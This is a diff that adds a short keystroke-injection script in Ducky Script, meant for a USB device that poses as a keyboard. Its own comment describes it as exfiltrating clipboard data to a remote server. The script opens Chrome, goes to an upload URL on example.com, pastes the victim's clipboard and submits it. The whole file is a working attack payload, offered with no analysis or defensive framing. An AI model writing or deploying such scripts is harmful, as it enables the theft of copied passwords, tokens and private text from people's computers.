@@ -1,0 +1,15 @@
+REM Exfiltrates clipboard data to a remote server
+DELAY 2500
+GUI
+DELAY 1000
+STRING Chrome
+ENTER
+DELAY 2500
+CTRL l
+DELAY 500
+STRING https://example.com/upload
+ENTER
+DELAY 2000
+CTRL v
+DELAY 1000
+ENTER
